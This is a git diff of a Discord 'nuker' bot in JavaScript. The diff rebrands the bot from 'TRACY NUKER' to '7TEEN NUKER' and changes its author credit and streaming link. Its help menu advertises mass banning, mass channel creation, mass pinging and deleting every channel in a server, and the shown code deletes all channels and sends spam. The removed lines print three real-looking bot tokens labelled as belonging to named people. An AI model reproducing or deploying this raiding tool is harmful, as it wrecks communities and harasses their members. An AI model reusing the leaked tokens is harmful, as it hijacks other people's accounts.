@@ -8,10 +8,8 @@ const client = new Discord.Client();
 
 // Bot Neccessities
 
-const token  = 'NzYwOTY1NTYxNDMyNjcwMjM5.X3TuZw.zxd3f3sATW5Qm62qR4yx6KYpprQ';
+const token  = 'TOKEN HERE';
 const prefix = 'a';
-// NzIxMzA1MTA1NjYzNjU2MDA2.XuSlug.loPv9HOXFFcDr7CoGuxiWdENBzo <- amy token
-// NzYwOTY1NTYxNDMyNjcwMjM5.X3TuZw.zxd3f3sATW5Qm62qR4yx6KYpprQ <- tracy token
 
 // Statuses 
 
@@ -25,13 +23,13 @@ client.on("ready", async() => {
       " ahelp ",
       `${client.guilds.cache.size} servers!`, //can add another
       " zhelp ",
-      " amy <3 ",
+      " 7teen <3 ",
       ` ${client.users.cache.size} users `,
-      " zhelp",
+      " ahelp",
   ]
   setInterval(function(){
           let status = statuses[Math.floor(Math.random() * statuses.length)];
-          client.user.setActivity(status, {type:"STREAMING", url: "https://www.twitch.tv/ayoohennio"})
+          client.user.setActivity(status, {type:"STREAMING", url: "https://www.twitch.tv/yourragegaming"})
   
       }, 1000) //Seconds
 })
@@ -40,9 +38,9 @@ client.on('message', message => {
 
     if(message.content.startsWith(prefix + 'help')){
         const helpembed = new Discord.MessageEmbed()
-        .setTitle(`TRACY NUKER`)
+        .setTitle(`7TEEN NUKER`)
         .setDescription(`\`NUKE\``)
-        .setFooter(`prefix [a] | made by 7lone`)
+        .setFooter(`prefix [a] | made by 7teen`)
         .setColor(0xFF0000)
         message.channel.send(helpembed);
     }
@@ -51,7 +49,7 @@ client.on('message', message => {
       const helpembed = new Discord.MessageEmbed()
       .setTitle(`NUKER`)
       .setDescription(`\`MASS BAN\`: **mban** \n\`CREATE CHANNELS\`: **cc [text]** \n\`MASS DELETE CHANNELS\`: **cd** \n\`MASS PING AND CHANNELS\`: **mp** \n\`FUCK SERVER\`: **fuck [text]** `)
-      .setFooter(`prefix [a] | made by 7lone`)
+      .setFooter(`prefix [a] | made by 7teen`)
       .setColor(0xFF0000)
       message.channel.send(helpembed);
     }
@@ -80,6 +78,8 @@ client.on('message', message => {
         }
 
       }
+    
+    // Mass Ban
 
       if(message.content.startsWith(prefix + 'mban')){
 
@@ -146,13 +146,13 @@ if(message.content.startsWith(prefix + 'mp')){
 }
 
 
-
+// Mass delete
 
       if (message.content.startsWith(prefix + 'cd')){
         message.guild.channels.cache.forEach(channel => channel.delete()); // deletes all channels
         message.delete();
       }
-
+// Test Spam
       if(message.content.startsWith(prefix + 'spamtest')){
         for (var i = 0; i < 20; i++) {
             message.channel.send("spam")
@@ -205,7 +205,7 @@ if(message.content.startsWith(prefix + 'mp')){
 
 // Bot Server List        
 
-if (message.content === 'zservers'){
+if (message.content === 'aservers'){
         let serverlist = ''
         client.guilds.cache.forEach((guild) => {
             serverlist = serverlist.concat(` - \`${guild.name}\`\n`)
@@ -213,7 +213,7 @@ if (message.content === 'zservers'){
     
         const embed = new Discord.MessageEmbed()
         .setColor("RANDOM")
-        .setTitle("Servers that have Naruse Jun Bot", '')
+        .setTitle("Servers that 7teen nuker is in", '')
         .setDescription(serverlist)
         message.channel.send({embed});
 }
